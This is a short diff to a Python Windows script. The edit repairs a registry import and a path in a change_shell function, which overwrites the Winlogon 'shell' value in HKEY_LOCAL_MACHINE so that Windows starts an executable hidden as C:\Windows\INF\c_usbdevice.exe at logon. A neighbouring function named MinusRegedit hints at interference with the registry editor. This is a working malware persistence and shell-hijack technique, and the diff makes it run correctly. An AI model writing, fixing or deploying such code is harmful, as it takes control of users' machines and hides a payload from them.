@@ -9,7 +9,7 @@ import time
 from ctypes import windll, c_int, c_uint, c_ulong, byref, POINTER
 import subprocess
 
-import reg
+import winreg as reg
 import win32gui
 import win32con
 
@@ -111,7 +111,7 @@ def MinusRegedit():
 def change_shell():
     try:
         key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
-        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:/Windows/INF/c_usbdevice.exe")
+        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:\Windows\INF\c_usbdevice.exe")
         reg.CloseKey(key)
     except Exception as e:
         print(f"Ошибка при установке значения реестра: {e}")
